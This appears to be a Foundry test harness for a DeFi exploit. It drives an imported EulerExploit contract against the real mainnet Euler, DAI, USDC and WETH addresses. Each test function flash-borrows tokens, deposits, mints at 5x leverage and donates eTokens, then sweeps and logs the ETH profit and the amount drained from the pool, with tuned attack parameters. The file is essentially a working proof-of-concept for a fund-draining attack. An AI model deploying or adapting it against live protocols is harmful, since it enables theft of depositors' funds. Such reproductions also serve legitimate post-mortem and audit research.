// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/EulerExploit.sol";

contract TestEuler is Test {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    EulerExploit public exploit;

    function setUp() public {
        exploit = new EulerExploit();
    }

    function testCheckMarkets() public {
        // Check eToken addresses
        address eWETH = IEulerMarkets(MARKETS).underlyingToEToken(WETH);
        address eDAI = IEulerMarkets(MARKETS).underlyingToEToken(DAI);
        address eUSDC = IEulerMarkets(MARKETS).underlyingToEToken(USDC);

        emit log_named_address("eWETH", eWETH);
        emit log_named_address("eDAI", eDAI);
        emit log_named_address("eUSDC", eUSDC);

        // Check available cash
        emit log_named_uint("WETH in Euler", IERC20(WETH).balanceOf(EULER));
        emit log_named_uint("DAI in Euler", IERC20(DAI).balanceOf(EULER));
        emit log_named_uint("USDC in Euler", IERC20(USDC).balanceOf(EULER));
    }

    function testAttackDAI() public {
        uint256 daiInEuler = IERC20(DAI).balanceOf(EULER);
        emit log_named_uint("DAI in Euler before", daiInEuler);

        // Conservative params: flash 30M, deposit 70%, leverage 5x, donate 60%
        exploit.attack(
            DAI,
            30_000_000e18,  // flash 30M DAI
            0.7e18,         // deposit 70% = 21M
            5e18,           // 5x leverage = mint 105M
            0.6e18          // donate 60% of eTokens
        );
        exploit.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 daiInEulerAfter = IERC20(DAI).balanceOf(EULER);
        emit log_named_uint("ETH profit", ethProfit);
        emit log_named_uint("DAI in Euler after", daiInEulerAfter);
        emit log_named_uint("DAI drained", daiInEuler > daiInEulerAfter ? daiInEuler - daiInEulerAfter : 0);
    }

    function testAttackUSDC() public {
        uint256 usdcInEuler = IERC20(USDC).balanceOf(EULER);
        emit log_named_uint("USDC in Euler before", usdcInEuler);

        // Flash 50M USDC, deposit 70%, 5x leverage, donate 60%
        exploit.attack(
            USDC,
            50_000_000e6,   // flash 50M USDC
            0.7e18,         // deposit 70% = 35M
            5e18,           // 5x leverage
            0.6e18          // donate 60%
        );
        exploit.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 usdcInEulerAfter = IERC20(USDC).balanceOf(EULER);
        emit log_named_uint("ETH profit", ethProfit);
        emit log_named_uint("USDC in Euler after", usdcInEulerAfter);
    }

    function testAttackWETH() public {
        uint256 wethInEuler = IERC20(WETH).balanceOf(EULER);
        emit log_named_uint("WETH in Euler before", wethInEuler);

        // Flash 10K WETH, deposit 70%, 5x leverage, donate 60%
        exploit.attack(
            WETH,
            10_000e18,    // flash 10K WETH
            0.7e18,       // deposit 70% = 7K
            5e18,         // 5x leverage
            0.6e18        // donate 60%
        );
        exploit.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 wethInEulerAfter = IERC20(WETH).balanceOf(EULER);
        emit log_named_uint("ETH profit", ethProfit);
        emit log_named_uint("WETH in Euler after", wethInEulerAfter);
    }

    receive() external payable {}
}
